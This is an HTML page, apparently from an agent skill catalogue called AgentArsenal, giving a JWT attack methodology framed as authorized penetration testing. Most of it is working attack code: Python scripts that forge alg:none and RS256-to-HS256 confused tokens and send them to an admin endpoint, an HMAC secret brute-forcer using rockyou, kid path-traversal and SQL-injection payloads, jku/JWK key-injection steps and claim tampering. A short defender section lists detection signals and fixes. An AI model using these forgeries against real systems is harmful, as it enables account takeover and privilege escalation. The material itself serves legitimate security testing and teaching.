@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: jwt-attacks</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>jwt-attacks</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing JSON Web Token handling on an authorized</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="auth-attacks.html">auth-attacks</a> <a href="api-security-testing.html">api-security-testing</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr></tbody></table><p>JSON Web Tokens carry identity claims (who you are, what role you have) protected by a signature the server should verify. When verification is weak, attackers forge tokens and become anyone. This skill covers the full authorized methodology: reading tokens, attacking the algorithm, brute forcing secrets, injecting keys, and tampering claims. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Capture a real token at login and decode its header, payload, and</li>
+<p>signature.</p>
+<li>Note the algorithm (<code>alg</code>), key id (<code>kid</code>), and every claim</li>
+<p>(<code>sub</code>, <code>role</code>, <code>exp</code>, <code>aud</code>, <code>iss</code>).</p>
+<li>Test the <code>none</code> algorithm and algorithm confusion (RS256 to HS256).</li>
+<li>Brute force weak HMAC secrets with a wordlist.</li>
+<li>Test <code>kid</code> for path traversal and SQL injection, and <code>jku</code>/<code>x5u</code></li>
+<p>for key URL redirection.</p>
+<li>Tamper claims: change <code>sub</code> to another user, escalate <code>role</code>,</li>
+<p>extend or drop <code>exp</code>.</p>
+<li>Replay forged tokens against protected endpoints and confirm the</li>
+<p>server honors them.</p>
+<li>Record the forged token, the endpoint, and the privilege gained.</li>
+</ol>
+<h2>1. Decoding and structure analysis</h2>
+<p>A JWT is three base64url parts: <code>header.payload.signature</code>.</p>
+<pre><code class="language-bash"># Decode a token quickly with Python (stdlib only)
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import base64, json, sys
+tok = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.SIGNATURE&quot;
+def dec(p):
+    return json.loads(base64.urlsafe_b64decode(p + &quot;=&quot; * (-len(p) % 4)))
+h, p, s = tok.split(&quot;.&quot;)
+print(&quot;header:&quot;, json.dumps(dec(h), indent=2))
+print(&quot;payload:&quot;, json.dumps(dec(p), indent=2))
+print(&quot;signature present:&quot;, bool(s))
+EOF</code></pre>
+<pre><code class="language-bash"># Grab the token the app actually issues and decode it
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;username&quot;:&quot;testuser&quot;,&quot;password&quot;:&quot;Testpass1!&quot;}&#x27; | python3 -c &quot;
+import base64, json, sys
+tok = json.load(sys.stdin)[&#x27;token&#x27;]
+h, p, s = tok.split(&#x27;.&#x27;)
+d = lambda x: json.loads(base64.urlsafe_b64decode(x + &#x27;=&#x27; * (-len(x) % 4)))
+print(&#x27;alg:&#x27;, d(h).get(&#x27;alg&#x27;), &#x27;| kid:&#x27;, d(h).get(&#x27;kid&#x27;), &#x27;| jku:&#x27;, d(h).get(&#x27;jku&#x27;))
+print(&#x27;claims:&#x27;, d(p))&quot;</code></pre>
+<p>Checklist from the decode: symmetric (<code>HS256/384/512</code>) versus asymmetric (<code>RS256/384/512</code>, <code>ES256</code>) algorithm, presence of <code>kid</code>, <code>jku</code>, <code>x5u</code>, <code>x5c</code>, and whether security claims (<code>exp</code>, <code>aud</code>, <code>iss</code>) exist at all.</p>
+<h2>2. The none algorithm</h2>
+<p>Some servers accept <code>alg: none</code> and skip verification entirely.</p>
+<pre><code class="language-bash"># Forge a none-alg token with Python and test it
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import base64, json, urllib.request
+
+def b64(o):
+    return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b&quot;=&quot;).decode()
+
+# take the real payload, escalate the role, sign with nothing
+header = {&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;}
+payload = {&quot;sub&quot;: &quot;1&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}
+forged = b64(header) + &quot;.&quot; + b64(payload) + &quot;.&quot;
+
+req = urllib.request.Request(&quot;https://target.example/api/admin/users&quot;,
+    headers={&quot;Authorization&quot;: &quot;Bearer &quot; + forged})
+try:
+    print(urllib.request.urlopen(req, timeout=10).getcode())
+except Exception as e:
+    print(&quot;rejected:&quot;, e)
+EOF</code></pre>
+<p>Variants to try: <code>&quot;alg&quot;: &quot;None&quot;</code>, <code>&quot;alg&quot;: &quot;none&quot;</code> with a non-empty signature, and stripping the signature segment entirely (two parts instead of three). If any is accepted, you have full account control.</p>
+<h2>3. RS256 to HS256 key confusion</h2>
+<p>When the server verifies RS256 with a library call that also accepts HS256, you can sign with the RSA *public* key used as an HMAC secret.</p>
+<pre><code class="language-bash"># Step 1: get the server&#x27;s RSA public key. Common spots:
+# https://target.example/.well-known/jwks.json
+# https://target.example/api/public-key.pem
+curl -s &#x27;https://target.example/.well-known/jwks.json&#x27; | head -c 600</code></pre>
+<pre><code class="language-bash"># Step 2: forge in Python: header says HS256, HMAC-signed with the
+# public key bytes as the secret (cryptography-free HMAC via hashlib)
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import base64, json, hmac, hashlib, urllib.request
+
+# paste the PEM public key (strip headers) as the HMAC secret
+PUBLIC_PEM = b&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
+-----END PUBLIC KEY-----&quot;&quot;&quot;
+
+def b64d(o): return base64.urlsafe_b64encode(o).rstrip(b&quot;=&quot;).decode()
+def b64e(o): return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b&quot;=&quot;).decode()
+
+header = {&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}
+payload = {&quot;sub&quot;: &quot;1&quot;, &quot;username&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}
+signing = (b64e(header) + &quot;.&quot; + b64e(payload)).encode()
+sig = b64d(hmac.new(PUBLIC_PEM, signing, hashlib.sha256).digest())
+forged = signing.decode() + &quot;.&quot; + sig
+print(forged)
+EOF</code></pre>
+<p>This only works if the server&#x27;s JWT library is misconfigured to accept both algorithms with one code path. Test it; when it lands, it is critical.</p>
+<h2>4. Weak HMAC secret brute force</h2>
+<p>HS256 with <code>secret</code>, <code>password123</code>, or the app name as the key is still common. Crack it offline, then forge freely.</p>
+<pre><code class="language-bash"># jwt-cracker style loop in pure Python against a wordlist
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import base64, json, hmac, hashlib
+
+tok = &quot;PASTE_REAL_TOKEN_HERE&quot;
+h_b64, p_b64, s_b64 = tok.split(&quot;.&quot;)
+signing = (h_b64 + &quot;.&quot; + p_b64).encode()
+target = base64.urlsafe_b64decode(s_b64 + &quot;=&quot; * (-len(s_b64) % 4))
+alg = json.loads(base64.urlsafe_b64decode(h_b64 + &quot;=&quot; * (-len(h_b64) % 4)))[&quot;alg&quot;]
+digest = {&quot;HS256&quot;: hashlib.sha256, &quot;HS384&quot;: hashlib.sha384, &quot;HS512&quot;: hashlib.sha512}[alg]
+
+with open(&quot;/usr/share/wordlists/rockyou.txt&quot;, errors=&quot;ignore&quot;) as f:
+    for line in f:
+        secret = line.rstrip(&quot;\n&quot;).encode()
+        if hmac.new(secret, signing, digest).digest() == target:
+            print(&quot;FOUND SECRET:&quot;, line.rstrip(&quot;\n&quot;))
+            break
+EOF</code></pre>
+<pre><code class="language-bash"># Also try the obvious candidates first: empty string, &quot;secret&quot;,
+# the app name, and the JWT&#x27;s own claims
+for s in &quot;&quot; secret password changeme target; do
+  echo &quot;trying: [$s]&quot;
+done</code></pre>
+<p>With the secret, forge any claim set you want using the same signing code as section 3 but with the cracked secret.</p>
+<h2>5. kid, jku, and x5u injection</h2>
+<p>The <code>kid</code> header tells the server which key to use. If it is used unsafely, it becomes an injection point.</p>
+<pre><code class="language-bash"># kid path traversal: does the server load the key from disk?
+# Try kid values and watch for verification behavior changes:
+#   ../../etc/passwd
+#   ../../dev/null  (empty key: some stacks then accept any signature)
+# Test by forging a token signed with HMAC of empty string and kid
+# pointing at /dev/null.</code></pre>
+<pre><code class="language-bash"># kid SQL injection: if kids come from a database, try
+#   &#x27; OR &#x27;1&#x27;=&#x27;1
+# and time-based variants, watching for login bypasses or errors.</code></pre>
+<p><code>jku</code> (JWK Set URL) and <code>x5u</code> (X.509 URL) let the token name its own key source:</p>
+<pre><code class="language-bash"># 1. Host a JWKS file on your server containing YOUR RSA key:
+#    {&quot;keys&quot;:[{&quot;kty&quot;:&quot;RSA&quot;,&quot;kid&quot;:&quot;evil&quot;,&quot;n&quot;:&quot;...&quot;,&quot;e&quot;:&quot;AQAB&quot;}]}
+# 2. Forge a token with header {&quot;alg&quot;:&quot;RS256&quot;,&quot;jku&quot;:&quot;https://your-server/jwks.json&quot;,&quot;kid&quot;:&quot;evil&quot;}
+# 3. Sign it with YOUR private key.
+# If the server fetches your JWKS and trusts it, you mint admin tokens.</code></pre>
+<p>This is also SSRF (the server fetches your URL), so the ssrf skill&#x27;s filter bypasses apply if the server restricts the key URL.</p>
+<h2>6. Claim tampering</h2>
+<p>Even with valid signatures, logic bugs in claim handling break authorization.</p>
+<pre><code class="language-bash"># Take a valid low-privilege token and test each claim change by
+# re-signing (with cracked secret) or by none-alg/confusion:
+# - &quot;sub&quot;: &quot;1&quot;            -&gt; another user&#x27;s id (IDOR via token)
+# - &quot;role&quot;: &quot;user&quot;        -&gt; &quot;admin&quot;
+# - &quot;username&quot;: &quot;bob&quot;     -&gt; &quot;admin&quot;
+# - drop &quot;exp&quot; entirely   -&gt; token never expires?
+# - &quot;exp&quot;: 9999999999     -&gt; far-future expiry accepted?
+# - &quot;aud&quot;: &quot;other-app&quot;    -&gt; audience not checked?</code></pre>
+<pre><code class="language-bash"># Quick test harness: modify one claim at a time and hit a protected
+# endpoint, logging which mutation the server accepts
+python3 - &lt;&lt;&#x27;EOF&#x27;
+import base64, json, urllib.request
+# fill in: REAL_TOKEN, SECRET (or use none-alg from section 2)
+EOF</code></pre>
+<p>Also test claim type confusion: <code>&quot;admin&quot;: &quot;true&quot;</code> (string) versus <code>&quot;admin&quot;: true</code> (boolean), and array versus string roles. Parsers that are loose about types often grant access on the wrong type.</p>
+<h2>7. JWK injection (embedded keys)</h2>
+<p>If the header contains a <code>jwk</code> with the public key inline, the server might trust the token&#x27;s own key.</p>
+<pre><code class="language-bash"># Forge a token whose header embeds YOUR public key as &quot;jwk&quot;,
+# sign with your private key. If accepted, the signature check is
+# meaningless because the attacker supplies the key.</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The token lives in an HttpOnly cookie, not a header: all the same</li>
+<p>attacks apply, just send the forged token as the cookie value.</p>
+<li>The server verifies the signature but ignores <code>exp</code>: session tokens</li>
+<p>never expire, so one leaked token is a permanent backdoor; note it.</p>
+<li>Multiple tokens (access plus refresh): the refresh flow is a second</li>
+<p>attack surface; test it with the same techniques.</p>
+<li>The app uses encrypted JWTs (JWE, <code>alg: dir</code>): you cannot read or</li>
+<p>forge without the key; test for padding oracle or key confusion only if the engagement covers crypto, otherwise note the opacity.</p>
+<li><code>at_hash</code> / <code>c_hash</code> mismatches: informational, but sloppy OIDC</li>
+<p>implementations sometimes skip them, hinting at loose validation elsewhere.</p>
+<li>Clock skew: <code>nbf</code>/<code>iat</code> in the future may still be accepted; useful</li>
+<p>for pre-playing tokens but rarely decisive.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Secret brute force fails on rockyou: build a targeted list from the</li>
+<p>app (company name, product name, &quot;jwt&quot;, &quot;secret&quot;, years) before giving up; short targeted lists beat huge generic ones.</p>
+<li>Key confusion fails: check whether the server publishes multiple</li>
+<p>keys (JWKS rotation); try each public key as the HMAC secret.</p>
+<li><code>jku</code> restricted to the app&#x27;s domain: look for an open redirect or</li>
+<p>a file upload on that domain to host your JWKS (redirect chains sometimes pass naive allow-list checks).</p>
+<li>Signature solid but claims sloppy: pivot to claim tampering and</li>
+<p>type confusion, which need no crypto break at all.</p>
+<li>Everything verifies correctly: the token may still leak (logged in</li>
+<p>URLs, stored in localStorage readable by XSS); chain with web-xss rather than forcing the crypto.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see JWT attacks as tokens with <code>alg: none</code>, unexpected <code>kid</code> values containing paths or SQL, <code>jku</code>/<code>x5u</code> pointing at external domains, and sudden role or subject changes for a known user. Logs showing one account&#x27;s token suddenly carrying another account&#x27;s <code>sub</code> are a clear signal. The durable fixes are an explicit allow-list of permitted algorithms (never accept <code>none</code>, never mix symmetric and asymmetric verification in one code path), strong random HMAC secrets (256 bits from a CSPRNG), strict <code>kid</code> handling (map IDs to keys server side, never build file paths or SQL from them), validating <code>exp</code>, <code>aud</code>, and <code>iss</code> on every request, and pinning <code>jku</code>/<code>x5u</code> to trusted HTTPS URLs. Rotate keys and keep token lifetimes short.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): token</li>
+<p>endpoint abuse.</p>
+<li>MITRE ATT&amp;CK T1539 (Steal Web Session Cookie): token theft.</li>
+<li>MITRE ATT&amp;CK T1550.001 (Use Alternate Authentication Material:</li>
+<p>Application Access Token): forged token use.</p>
+<li>CWE-347 (Improper Verification of Cryptographic Signature).</li>
+<li>CWE-327 (Use of a Broken or Risky Cryptographic Algorithm): none</li>
+<p>algorithm.</p>
+<li>CWE-798 (Use of Hard-coded Credentials): weak JWT secrets.</li>
+<li>CWE-639 (Authorization Bypass Through User-Controlled Key): sub</li>
+<p>tampering.</p>
+<li>OWASP JWT Cheat Sheet.</li>
+<li>RFC 7515 (JWS), RFC 7519 (JWT).</li>
+<li>PortSwigger Web Security Academy: JWT labs and cheat sheet.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
